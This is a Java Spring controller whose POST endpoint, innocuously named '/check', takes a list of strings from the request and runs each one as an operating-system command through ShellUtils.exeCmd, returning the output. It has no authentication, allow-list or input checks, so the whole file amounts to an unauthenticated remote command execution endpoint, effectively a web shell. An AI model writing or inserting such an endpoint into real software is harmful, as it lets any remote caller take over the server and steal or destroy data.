package com.dkdy.util.shellController;

import java.util.ArrayList;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class ShellController {
	@PostMapping("/check")
	public String extshell(@RequestParam ShellBean shell ) {
		String exeCmd="";
		ArrayList<String> list = shell.getList();
		for (String string : list) {
			exeCmd = ShellUtils.exeCmd(string);
		}
		
		return exeCmd;
	}

}
